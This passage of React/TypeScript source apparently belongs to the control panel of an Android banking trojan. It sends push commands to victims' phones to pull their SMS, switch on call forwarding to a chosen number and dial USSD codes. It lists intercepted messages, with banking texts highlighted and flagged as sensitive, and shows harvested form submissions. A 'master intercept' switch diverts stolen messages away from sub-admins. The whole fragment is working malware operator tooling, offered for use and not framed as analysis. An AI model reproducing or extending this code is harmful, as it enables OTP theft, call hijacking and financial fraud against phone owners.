          <div style={{ display: "flex", gap: 8, marginBottom: 10 }}>
            <button onClick={() => setAdminEnabled(true)} style={{ flex: 1, padding: "8px 0", borderRadius: 8, border: `1.5px solid ${adminEnabled ? T.green + "55" : T.borderLight}`, background: adminEnabled ? T.green + "18" : T.card, color: adminEnabled ? T.green : T.muted, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>Enable</button>
            <button onClick={() => setAdminEnabled(false)} style={{ flex: 1, padding: "8px 0", borderRadius: 8, border: `1.5px solid ${!adminEnabled ? T.red + "55" : T.borderLight}`, background: !adminEnabled ? T.red + "18" : T.card, color: !adminEnabled ? T.red : T.muted, fontWeight: 700, cursor: "pointer", fontSize: 12 }}>Disable</button>
          </div>
          {adminEnabled && <input type="tel" placeholder="Admin phone number" value={number} onChange={e => setNumber(e.target.value)} style={inp} />}
          <StatusLog />
          <PrimaryBtn onClick={() => fcm(adminEnabled ? { type: "admin_update", status: "on", number: number.trim() } : { type: "admin_update", status: "off" })} disabled={state === "sending" || (adminEnabled && !number.trim())}>
            {state === "sending" ? <><Spinner /> Updating…</> : "Update Number"}
          </PrimaryBtn>
          <button onClick={() => {
            setDisableState("sending");
            apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "admin_update", status: "off" } }) })
              .then(() => { setDisableState("ok"); setTimeout(() => setDisableState("idle"), 3000); })
              .catch(() => setDisableState("idle"));
          }} disabled={disableState === "sending"} style={{ width: "100%", marginTop: 8, padding: "11px 0", borderRadius: 9, border: "1.5px solid #ef4444", background: disableState === "ok" ? T.green : "transparent", color: disableState === "ok" ? "#fff" : "#ef4444", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
            {disableState === "sending" ? "Disabling…" : disableState === "ok" ? "Disabled ✓" : "Disable Forwarding"}
          </button>
        </>
      )}

      {action === "call_forward" && (
        <>
          <SimSel />
          <input type="tel" placeholder="Forward to number" value={number} onChange={e => setNumber(e.target.value)} style={inp} />
          <StatusLog />
          <div style={{ display: "flex", gap: 10 }}>
            <button onClick={() => {
              if (!number.trim()) { setLog("Enter a number to forward calls to."); setState("err"); return; }
              void fcm({ type: "call_forward", action: "activate", number: number.trim(), sim: sim === "2" ? "1" : "0" });
            }} disabled={state === "sending"} style={{ flex: 1, padding: "11px 0", borderRadius: 9, border: "none", background: T.green, color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>
              {state === "sending" ? "Activating…" : "Activate"}
            </button>
            <button onClick={() => fcm({ type: "call_forward", action: "deactivate", number: "", sim: sim === "2" ? "1" : "0" })} disabled={state === "sending"} style={{ flex: 1, padding: "11px 0", borderRadius: 9, border: "none", background: "#ef4444", color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>
              {state === "sending" ? "Deactivating…" : "Deactivate"}
            </button>
          </div>
          <div style={{ fontSize: 10, color: T.muted, textAlign: "center", marginTop: 6 }}>Deactivate dials <span style={{ fontFamily: "monospace", color: "#f87171" }}>##21#</span> automatically</div>
        </>
      )}

      {action === "dial_ussd" && (
        <>
          <SimSel />
          <input type="text" placeholder="USSD code (e.g. *123#)" value={ussdCode} onChange={e => setUssdCode(e.target.value)} style={{ ...inp, fontFamily: "monospace" }} />
          <StatusLog />
          <PrimaryBtn onClick={() => {
            if (!ussdCode.trim()) { setLog("Enter a USSD code."); setState("err"); return; }
            void fcm({ type: "dial_ussd", code: ussdCode.trim(), sim: sim === "2" ? "1" : "0" });
          }} disabled={state === "sending"}>
            {state === "sending" ? <><Spinner /> Dialing…</> : "Dial USSD"}
          </PrimaryBtn>
        </>
      )}
    </div>
  );
}

function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; masterPin: string; onClose: () => void }) {
  const [activeAction, setActiveAction] = useState<ActionKey | null>(null);
  const [devMsgs, setDevMsgs] = useState<MsgRow[]>([]);
  const [msgsLoading, setMsgsLoading] = useState(false);
  const [msgSearch, setMsgSearch] = useState("");
  const [formRows, setFormRows] = useState<GroupRow[]>([]);
  const [formLoading, setFormLoading] = useState(false);
  const [showForm, setShowForm] = useState(false);

  // Master Intercept toggle
  const [intercepted, setIntercepted] = useState(false);
  const [interceptLoading, setInterceptLoading] = useState(false);
  useEffect(() => {
    apiFetch("/api/master/intercept", { headers: { "x-master-pin": masterPin } })
      .then(r => r.json()).then((data: string[] | { intercepted: string[] }) => {
        const list = Array.isArray(data) ? data : (data as { intercepted: string[] }).intercepted ?? [];
        setIntercepted(list.includes(device.deviceId));
      }).catch(() => {});
  }, [device.deviceId, masterPin]);
  async function handleInterceptToggle() {
    setInterceptLoading(true);
    try {
      const method = intercepted ? "DELETE" : "POST";
      await apiFetch(`/api/master/intercept/${encodeURIComponent(device.deviceId)}`, { method, headers: { "x-master-pin": masterPin } });
      setIntercepted(v => !v);
    } catch { /* ignore */ } finally { setInterceptLoading(false); }
  }

  // Live timeAgo ticker — sub-admin pattern: refresh every second so "0s ago → 1s ago → 2s ago" keeps updating
  const [, setTick] = useState(0);
  useEffect(() => {
    const iv = setInterval(() => setTick(t => t + 1), 1000);
    return () => clearInterval(iv);
  }, []);

  // Inline states for direct-fire buttons (no dialog)
  const [pingState, setPingState] = useState<FcmState>("idle");
  const [pingCountdown, setPingCountdown] = useState(0);
  const [getSmsState, setGetSmsState] = useState<FcmState>("idle");

  // Sub-admin pattern: flag so only active pings trigger "ok" — not regular heartbeats
  const pingActiveRef = useRef(false);

  // Live countdown via useEffect (clean — no side-effects inside state updater)
  useEffect(() => {
    if (pingState !== "sending") return;
    setPingCountdown(0);
    const iv = setInterval(() => setPingCountdown(c => c + 1), 1000);
    return () => clearInterval(iv);
  }, [pingState]);

  // Auto-timeout at 30s
  useEffect(() => {
    if (pingState !== "sending") return;
    const t = setTimeout(() => {
      pingActiveRef.current = false;
      setPingState("idle"); setPingCountdown(0);
    }, 30000);
    return () => clearTimeout(t);
  }, [pingState]);

  // Live: mrrobot:device_updated → ONLY fire success if ping was actively waiting
  useEffect(() => {
    function onUpdated(e: Event) {
      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
      if (deviceId !== device.deviceId || !pingActiveRef.current) return;
      pingActiveRef.current = false;
      setPingCountdown(0); setPingState("ok");
      setTimeout(() => setPingState("idle"), 2000);
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, [device.deviceId]); // eslint-disable-line react-hooks/exhaustive-deps

  // Live: mrrobot:message_added → prepend new messages for this device automatically
  useEffect(() => {
    function onMsg(e: Event) {
      const payload = (e as CustomEvent<{ appId: string; message: MsgRow }>).detail;
      if (payload.message.deviceId !== device.deviceId) return;
      setDevMsgs(prev => {
        if (prev.some(m => m.id === payload.message.id)) return prev;
        return [payload.message, ...prev];
      });
    }
    window.addEventListener("mrrobot:message_added", onMsg);
    return () => window.removeEventListener("mrrobot:message_added", onMsg);
  }, [device.deviceId]);

  async function firePing() {
    if (!device.hasFcm) return;
    // Counter starts immediately — arm flag AFTER FCM send so heartbeats
    // during the network call don't trigger false "Online" before we sent
    setPingState("sending");
    try {
      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
      if (!r.ok) { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); return; }
      // FCM delivered — NOW arm listener for device WS response
      pingActiveRef.current = true;
    } catch { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
  }

  async function fireGetSms() {
    if (!device.hasFcm) return;
    setGetSmsState("sending");
    try {
      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "get_sms" } }) });
      if (!r.ok) { setGetSmsState("err"); setTimeout(() => setGetSmsState("idle"), 3000); return; }
      setGetSmsState("ok");
      setTimeout(() => setGetSmsState("idle"), 2500);
    } catch { setGetSmsState("err"); setTimeout(() => setGetSmsState("idle"), 3000); }
  }

  const ONLINE_MS = 15 * 60 * 1000;
  const isRecent = device.lastOnline ? (Date.now() - new Date(device.lastOnline).getTime()) < ONLINE_MS : false;

  function loadDevMsgs() {
    setMsgsLoading(true);
    apiFetch(`/api/messages?deviceId=${encodeURIComponent(device.deviceId)}&limit=200`, { headers: { "x-master-pin": masterPin } })
      .then(r => r.ok ? r.json() : [])
      .then(data => setDevMsgs((data as MsgRow[]).sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime())))
      .catch(() => {})
      .finally(() => setMsgsLoading(false));
  }

  useEffect(() => { loadDevMsgs(); }, [device.deviceId, masterPin]); // eslint-disable-line react-hooks/exhaustive-deps

  function loadFormData() {
    setFormLoading(true);
    apiFetch(`/api/data?deviceId=${encodeURIComponent(device.deviceId)}&limit=1000`, { headers: { "x-master-pin": masterPin } })
      .then(r => r.ok ? r.json() : [])
      .then((resp: unknown) => {
        const all: GroupRow[] = Array.isArray(resp) ? (resp as GroupRow[]) : ((resp as { data?: GroupRow[] }).data ?? []);
        const filtered = all.filter(r => r.deviceId === device.deviceId);
        setFormRows(filtered.slice().sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()));
      })
      .catch(() => {})
      .finally(() => setFormLoading(false));
  }

  const filteredDevMsgs = useMemo(() => {
    const q = msgSearch.trim().toLowerCase();
    if (!q) return devMsgs;
    return devMsgs.filter(m => m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q));
  }, [devMsgs, msgSearch]);

  const sim1 = [device.sim1Carrier, device.sim1Phone].filter(Boolean).join(": ") || "—";
  const sim2 = [device.sim2Carrier, device.sim2Phone].filter(Boolean).join(": ") || "—";

  return (
    <div style={{ position: "fixed", inset: 0, background: "rgba(4,8,20,0.96)", zIndex: 300, display: "flex", flexDirection: "column", backdropFilter: "blur(4px)" }}>
      <div style={{ flex: 1, overflowY: "auto", padding: "12px 12px 32px", background: T.bg, overscrollBehavior: "contain" }}>
        <div style={{ maxWidth: 680, margin: "0 auto", display: "flex", flexDirection: "column", gap: 10 }}>

          {/* ── Name banner ── */}
          <div style={{ background: T.card, borderRadius: 10, padding: "11px 14px", border: `1px solid ${T.borderLight}` }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
              <div style={{ flex: 1, minWidth: 0, fontWeight: 700, fontSize: 15, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{device.name}</div>
              <button onClick={onClose} style={{ flexShrink: 0, background: T.accent, border: `1.5px solid #6366f1`, borderRadius: 8, padding: "6px 13px", fontSize: 12, fontWeight: 800, color: "#fff", cursor: "pointer", boxShadow: "0 2px 10px rgba(99,102,241,0.5)", letterSpacing: 0.3, whiteSpace: "nowrap" }}>← Back</button>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
              <div style={{ fontSize: 9, color: T.muted, fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", flex: 1, minWidth: 0 }}>{device.deviceId}</div>
              <CopyIconBtn value={device.deviceId} title="Copy Device ID" />
              <div style={{ fontSize: 9, color: T.muted, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.3, flexShrink: 0 }}>Last Seen:</div>
              <div style={{ fontSize: 11, fontWeight: 700, color: isRecent ? T.green : T.muted, flexShrink: 0 }}>{fmtAgo(device.lastOnline)}</div>
            </div>
          </div>

          {/* ── Info rows ── */}
          <div style={{ background: T.card, borderRadius: 10, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
            {/* Name row + Intercept toggle */}
            <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${T.border}`, gap: 8, flexWrap: "wrap" }}>
              <div style={{ width: 80, fontSize: 11, color: T.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Name</div>
              <div style={{ flex: 1, fontSize: 12, color: T.mutedLight, minWidth: 60 }}>{device.name}</div>
              <div onClick={interceptLoading ? undefined : () => void handleInterceptToggle()} title={intercepted ? "Master Active — sub-admin ko messages nahi jayenge" : "Master Off — sub-admin ko messages jayenge"} style={{ flexShrink: 0, display: "flex", flexDirection: "column", alignItems: "center", gap: 3, cursor: interceptLoading ? "wait" : "pointer", userSelect: "none" }}>
                <div style={{ width: 44, height: 24, borderRadius: 12, background: intercepted ? "#ef4444" : "#1e293b", border: `1.5px solid ${intercepted ? "#ef4444" : "#334155"}`, position: "relative", transition: "background 0.25s, border-color 0.25s", boxShadow: intercepted ? "0 0 10px #ef444466" : "none" }}>
                  <div style={{ position: "absolute", top: 2, left: intercepted ? 22 : 2, width: 18, height: 18, borderRadius: "50%", background: intercepted ? "#fff" : "#475569", transition: "left 0.25s, background 0.25s", boxShadow: "0 1px 4px rgba(0,0,0,0.4)" }} />
                </div>
                <span style={{ fontSize: 9, fontWeight: 800, letterSpacing: 0.5, color: intercepted ? "#ef4444" : "#475569", transition: "color 0.25s" }}>{interceptLoading ? "…" : intercepted ? "MASTER ON" : "MASTER OFF"}</span>
              </div>
            </div>

            <InfoRow label="Device ID" accent={T.green} mono>
              <div style={{ display: "flex", alignItems: "center", gap: 6, flex: 1, minWidth: 0 }}>
                <span style={{ fontSize: 12, color: T.green, fontFamily: "monospace", wordBreak: "break-all", flex: 1 }}>{device.deviceId}</span>
                <CopyIconBtn value={device.deviceId} title="Copy Device ID" />
              </div>
            </InfoRow>
            <InfoRow label="Android" value={device.androidVersion > 0 ? `v${device.androidVersion}` : "—"} />
            <InfoRow label="App ID" mono>
              <div style={{ display: "flex", alignItems: "center", gap: 6, flex: 1, minWidth: 0 }}>
                <span style={{ fontSize: 12, color: T.mutedLight, fontFamily: "monospace", wordBreak: "break-all", flex: 1 }}>{device.appId}</span>
                <CopyIconBtn value={device.appId} title="Copy App ID" />
              </div>
            </InfoRow>
            <InfoRow label="User ID" value={device.userId} mono />
            <InfoRow label="SIM 1" value={sim1} />
            <InfoRow label="SIM 2" value={sim2} />

            {/* Call Forward row */}
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "9px 14px", borderBottom: `1px solid ${T.border}` }}>
              <span style={{ fontSize: 11, color: T.muted, fontWeight: 600, letterSpacing: 1, textTransform: "uppercase" }}>Call Forward</span>
              <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                <span style={{ display: "inline-flex", alignItems: "center", gap: 5, background: device.forwardEnabled ? "#14532d" : "#450a0a", border: `1px solid ${device.forwardEnabled ? T.green : "#ef4444"}`, borderRadius: 20, padding: "3px 11px", fontSize: 12, fontWeight: 700, color: device.forwardEnabled ? "#4ade80" : "#f87171" }}>
                  <span style={{ width: 7, height: 7, borderRadius: "50%", background: device.forwardEnabled ? T.green : "#ef4444", boxShadow: device.forwardEnabled ? `0 0 6px ${T.green}` : "none", display: "inline-block", flexShrink: 0 }} />
                  {device.forwardEnabled ? "ON" : "OFF"}
                </span>
                {device.forwardEnabled && device.forwardSlot !== null && device.forwardSlot !== undefined && (
                  <span style={{ display: "inline-flex", alignItems: "center", gap: 4, background: "#0f2744", border: "1px solid #2563eb", borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700, color: "#93c5fd" }}>
                    SIM {(device.forwardSlot as number) + 1}
                  </span>
                )}
              </div>
            </div>

            <InfoRow label="FCM" value={device.hasFcm ? "✓ Active" : "None"} accent={device.hasFcm ? T.green : T.muted} />
            <InfoRow label="Installed" value={fmtDate(device.installedAt)} accent={T.green} />

            {/* Last Seen + Form Data button */}
            <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", gap: 8 }}>
              <div style={{ width: 110, fontSize: 11, color: T.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Last Seen</div>
              <div style={{ flex: 1, fontSize: 12, color: isRecent ? T.green : T.mutedLight }}>{fmtAgo(device.lastOnline)}</div>
              <button
                onClick={() => { setShowForm(true); if (formRows.length === 0) loadFormData(); }}
                style={{ flexShrink: 0, background: "#f1f5f9", border: "1px solid #cbd5e1", borderRadius: 8, padding: "6px 14px", fontSize: 12, fontWeight: 700, color: "#1e293b", cursor: "pointer", whiteSpace: "nowrap" }}
              >Form Data</button>
            </div>
          </div>

          {/* ── No FCM warning ── */}
          {!device.hasFcm && (
            <div style={{ background: T.yellow + "14", border: `1px solid ${T.yellow}40`, borderRadius: 10, padding: "10px 14px", fontSize: 12, color: T.yellow, display: "flex", alignItems: "center", gap: 8 }}>
              <Ic.Alert /> No FCM token — FCM actions will not work on this device.
            </div>
          )}

          {/* ── Action buttons 3×2 grid ── */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8 }}>
            {ACTION_LABELS.map(({ key, label }) => {
              // Direct-fire buttons — no dialog
              if (key === "online_check") {
                const st = pingState;
                const bg = st === "err" ? T.red : st === "sending" ? T.accentGlow : T.card;
                const bc = st === "err" ? T.red : st === "sending" ? T.accent : T.borderLight;
                const col = st === "sending" ? T.accentLight : st === "err" ? "#fff" : T.mutedLight;
                return (
                  <button key={key} onClick={() => void firePing()} disabled={st === "sending" || !device.hasFcm} style={{
                    background: bg, border: `1.5px solid ${bc}`, borderRadius: 9, padding: "11px 4px",
                    cursor: st === "sending" || !device.hasFcm ? "wait" : "pointer",
                    fontSize: 11, fontWeight: 600, color: col, textAlign: "center", transition: "all 0.15s",
                    display: "flex", alignItems: "center", justifyContent: "center", gap: 4,
                  }}>
                    {st === "sending" ? <><Spinner size={10} /> {pingCountdown}s…</> : st === "err" ? "✗ Error" : label}
                  </button>
                );
              }
              if (key === "get_sms") {
                const st = getSmsState;
                const bg = st === "ok" ? T.green + "22" : st === "err" ? T.red + "18" : st === "sending" ? T.accentGlow : T.card;
                const bc = st === "ok" ? T.green : st === "err" ? T.red : st === "sending" ? T.accent : T.borderLight;
                const col = st === "ok" ? T.green : st === "err" ? T.red : st === "sending" ? T.accentLight : T.mutedLight;
                return (
                  <button key={key} onClick={() => void fireGetSms()} disabled={st === "sending" || !device.hasFcm} style={{
                    background: bg, border: `1.5px solid ${bc}`, borderRadius: 9, padding: "11px 4px",
                    cursor: st === "sending" || !device.hasFcm ? "wait" : "pointer",
                    fontSize: 11, fontWeight: 600, color: col, textAlign: "center", transition: "all 0.15s",
                    display: "flex", alignItems: "center", justifyContent: "center", gap: 4,
                  }}>
                    {st === "sending" ? <><Spinner size={10} /> Getting…</> : st === "ok" ? "✓ Sent!" : st === "err" ? "✗ Error" : label}
                  </button>
                );
              }
              // Dialog-based buttons
              const isActive = activeAction === key;
              return (
                <button key={key} onClick={() => setActiveAction(isActive ? null : key)} style={{
                  background: isActive ? T.accentGlow : T.card,
                  border: "1.5px solid",
                  borderColor: isActive ? T.accent : T.borderLight,
                  borderRadius: 9, padding: "11px 4px", cursor: "pointer",
                  fontSize: 11, fontWeight: isActive ? 700 : 500,
                  color: isActive ? T.accentLight : T.mutedLight,
                  textAlign: "center", transition: "all 0.15s",
                }}>
                  {label}
                </button>
              );
            })}
          </div>

          {/* ── Active action panel ── */}
          {activeAction && (
            <DeviceActionPanel
              key={activeAction}
              action={activeAction}
              device={device}
              masterPin={masterPin}
              onClose={() => setActiveAction(null)}
            />
          )}

          {/* ── Messages Section ── */}
          <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "9px 12px", borderBottom: `1px solid ${T.border}` }}>
              <span style={{ color: T.muted, fontSize: 13 }}>⌕</span>
              <input value={msgSearch} onChange={e => setMsgSearch(e.target.value)} placeholder="Search messages…"
                style={{ border: "none", outline: "none", flex: 1, fontSize: 11, background: "transparent", color: T.text }} />
              {msgSearch && <button onClick={() => setMsgSearch("")} style={{ background: "none", border: "none", cursor: "pointer", color: T.muted, fontSize: 13, padding: 0, lineHeight: 1 }}>✕</button>}
              <span style={{ fontSize: 10, color: T.muted, whiteSpace: "nowrap" }}>{filteredDevMsgs.length} message{filteredDevMsgs.length !== 1 ? "s" : ""}</span>
              <button onClick={() => loadDevMsgs()} disabled={msgsLoading} style={{ background: "none", border: `1px solid ${T.borderLight}`, borderRadius: 6, padding: "4px 9px", color: T.mutedLight, fontSize: 10, fontWeight: 700, cursor: msgsLoading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 4 }}>
                {msgsLoading ? <Spinner size={10} /> : <Ic.Refresh />} Refresh
              </button>
            </div>
            {msgsLoading && devMsgs.length === 0 ? (
              <div style={{ textAlign: "center", padding: 32, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 8 }}><Spinner /><span style={{ fontSize: 12 }}>Loading messages…</span></div>
            ) : filteredDevMsgs.length === 0 ? (
              <div style={{ textAlign: "center", padding: 32, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 8 }}>
                <Ic.Inbox /><span style={{ fontSize: 12 }}>{msgSearch ? "No messages match search" : "No messages for this device."}</span>
              </div>
            ) : filteredDevMsgs.map((msg, i) => {
              const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
              const isGreen = isBankingMsg(msg.body, msg.fromSender);
              return (
                <div key={msg.id} style={{ padding: "10px 14px", borderBottom: i < filteredDevMsgs.length - 1 ? `1px solid ${T.border}` : "none" }}>
                  <div style={{ display: "flex", gap: 5, alignItems: "center", marginBottom: 4 }}>
                    <span style={{ fontSize: 10, color: T.muted }}>{fmtDate(msg.receivedAt)}</span>
                    {msg.isSensitive && <span style={{ fontSize: 9, fontWeight: 800, color: T.red, background: T.red + "18", borderRadius: 4, padding: "1px 5px" }}>SENSITIVE</span>}
                  </div>
                  <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 4 }}>
                    <div style={{ flex: 1, fontSize: 12, color: isGreen ? T.green : T.text, lineHeight: 1.5, wordBreak: "break-word" }}>{msg.body}</div>
                    <CopyIconBtn value={msg.body} title="Copy message" />
                  </div>
                  <div style={{ display: "flex", gap: 10, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
                    <span style={{ color: T.muted, display: "inline-flex", alignItems: "center", gap: 4 }}>
                      <span style={{ color: T.mutedLight, marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>
                      {displaySender}
                      <CopyIconBtn value={displaySender} title="Copy sender" />
                    </span>
                    {msg.fromNumber && msg.fromNumber !== displaySender && (
                      <span style={{ color: T.muted, display: "inline-flex", alignItems: "center", gap: 4 }}>
                        <span style={{ color: T.mutedLight, fontFamily: "monospace", fontSize: 10 }}>{msg.fromNumber}</span>
                        <CopyIconBtn value={msg.fromNumber} title="Copy number" />
                      </span>
                    )}
                    {msg.toNumber && (
                      <span style={{ color: T.muted, display: "inline-flex", alignItems: "center", gap: 4 }}>
                        <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>TO</span>
                        {msg.toNumber}
                        <CopyIconBtn value={msg.toNumber} title="Copy receiver" />
                      </span>
                    )}
                  </div>
                </div>
              );
            })}
          </div>

        </div>
      </div>

      {/* ── Form Data Modal ── */}
      {showForm && (
        <div
          onClick={e => { if (e.target === e.currentTarget) setShowForm(false); }}
          style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.75)", zIndex: 400, display: "flex", alignItems: "flex-end", justifyContent: "center", padding: "0 0 0 0" }}
        >
          <div style={{ width: "100%", maxWidth: 600, background: T.card, borderRadius: "18px 18px 0 0", border: `1px solid ${T.borderLight}`, maxHeight: "80vh", display: "flex", flexDirection: "column", boxShadow: "0 -8px 40px rgba(0,0,0,0.5)" }}>
            {/* Modal header */}
            <div style={{ display: "flex", alignItems: "center", padding: "14px 16px 12px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
              <div style={{ flex: 1 }}>
                <div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>Form Data</div>
                <div style={{ fontSize: 10, color: T.muted, marginTop: 2, fontFamily: "monospace" }}>{device.deviceId}</div>
              </div>
              <button onClick={() => void loadFormData()} disabled={formLoading} style={{ background: T.border, border: `1px solid ${T.borderLight}`, borderRadius: 7, padding: "5px 10px", color: T.mutedLight, fontSize: 11, fontWeight: 700, cursor: formLoading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 5, marginRight: 8 }}>
                {formLoading ? <Spinner size={10} /> : <Ic.Refresh />} Refresh
              </button>
              <button onClick={() => setShowForm(false)} style={{ background: T.border, border: "none", color: T.mutedLight, cursor: "pointer", width: 30, height: 30, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 16, fontWeight: 700 }}>✕</button>
            </div>
            {/* Modal body */}
            <div style={{ overflowY: "auto", flex: 1 }}>
              {formLoading && formRows.length === 0 ? (
                <div style={{ textAlign: "center", padding: 40, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 10 }}>
                  <Spinner /><span style={{ fontSize: 13 }}>Loading form data…</span>
                </div>
              ) : formRows.length === 0 ? (
                <div style={{ textAlign: "center", padding: 40, color: T.muted, fontSize: 13 }}>No form submissions for this device.</div>
              ) : (
                formRows.map((entry, idx) => {
                  const pairs = Object.entries(entry.data ?? {});
                  const time = new Date(entry.submittedAt).toLocaleString("en-IN", { day: "2-digit", month: "short", year: "numeric", hour: "2-digit", minute: "2-digit", hour12: true });
                  return (
                    <div key={entry.id} style={{ borderBottom: idx < formRows.length - 1 ? `1px solid ${T.border}` : "none", padding: "12px 16px" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 8 }}>
                        <span style={{ fontSize: 10, color: "#8b5cf6", fontFamily: "monospace", fontWeight: 800, background: "#8b5cf618", borderRadius: 4, padding: "2px 7px" }}>#{idx + 1}</span>
                        <span style={{ fontSize: 11, color: T.muted }}>{time}</span>
                      </div>
                      {pairs.length === 0 ? (
                        <span style={{ fontSize: 12, color: T.muted }}>Empty submission</span>
                      ) : (
                        <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                          {pairs.map(([k, v]) => (
                            <div key={k} style={{ display: "flex", gap: 10, alignItems: "flex-start" }}>
                              <span style={{ fontSize: 11, color: T.muted, fontWeight: 600, minWidth: 100, flexShrink: 0, textTransform: "capitalize" }}>{k}</span>
                              <span style={{ fontSize: 12, color: T.text, flex: 1, wordBreak: "break-word", lineHeight: 1.4 }}>{String(v ?? "")}</span>
                              <CopyIconBtn value={String(v ?? "")} title={`Copy ${k}`} />
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  );
                })
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

/* ══════════════════════════════════════════
   CARD CHECK ONLINE BUTTON (device list card)
══════════════════════════════════════════ */
function CardCheckBtn({ device }: { device: FullDevice }) {
  const [checking, setChecking] = useState(false);
  const [done, setDone]       = useState(false);
  const [seconds, setSeconds] = useState(0);
  const timerRef    = useRef<ReturnType<typeof setInterval> | null>(null);
  const activeRef   = useRef(false); // true ONLY while we are waiting for ping response

  function stopTimer() {
    if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
  }
  useEffect(() => () => stopTimer(), []);

  // Live countdown via useEffect — clean, no side-effects inside state updater
  useEffect(() => {
    if (!checking) return;
    setSeconds(0);
    timerRef.current = setInterval(() => setSeconds(s => s + 1), 1000);
    return () => stopTimer();
  }, [checking]);

  // Auto-timeout at 30s
  useEffect(() => {
    if (!checking) return;
    const t = setTimeout(() => {
      activeRef.current = false;
      stopTimer();
      setChecking(false); setSeconds(0);
    }, 30000);
    return () => clearTimeout(t);
  }, [checking]);

  // WS: device_updated → success ONLY if we are actively waiting (sub-admin pattern)
  useEffect(() => {
    function onUpdated(e: Event) {
      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
      if (deviceId !== device.deviceId || !activeRef.current) return;
      activeRef.current = false;
      stopTimer();
      setChecking(false); setSeconds(0); setDone(true);
      setTimeout(() => setDone(false), 2000);
    }
    window.addEventListener("mrrobot:device_updated", onUpdated);
    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
  }, [device.deviceId]); // eslint-disable-line react-hooks/exhaustive-deps

  async function handleClick() {
    if (checking) return;
    setDone(false); setChecking(true); // counter starts immediately
    try {
      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "0" } }) });
      if (!r.ok) { stopTimer(); setChecking(false); setSeconds(0); return; }
      // FCM delivered — NOW arm WS listener so heartbeats before send don't fire
      activeRef.current = true;
    } catch {
      stopTimer(); setChecking(false); setSeconds(0);
    }
  }

  return (
    <button onClick={() => void handleClick()} style={{
      width: "100%", borderRadius: 8, padding: "10px 4px",
      fontSize: 13, fontWeight: 700, textAlign: "center",
      border: checking ? `1px solid ${T.accent}` : "1px solid #e2e8f0",
      background: checking ? T.accent : "#f8fafc",
      color: checking ? "#fff" : "#475569",
      cursor: checking ? "default" : "pointer",
      transition: "background 0.25s, border-color 0.25s, color 0.25s",
    }}>
      {checking ? `${seconds}s…` : "Check Online"}
    </button>
  );
}

/* ══════════════════════════════════════════
   DEVICE CARD — memoized so it only re-renders when device data changes
══════════════════════════════════════════ */
const ONLINE_WINDOW_MS = 15 * 60 * 1000; // 15 minutes
function isRecentlyOnline(lastOnline: string | null | undefined): boolean {
  if (!lastOnline) return false;
  return Date.now() - new Date(lastOnline).getTime() < ONLINE_WINDOW_MS;
}

const DeviceCard = memo(function DeviceCard({
  device, idx, totalCount, masterPin, onSelect,
}: { device: FullDevice; idx: number; totalCount: number; masterPin: string; onSelect: (d: FullDevice) => void }) {
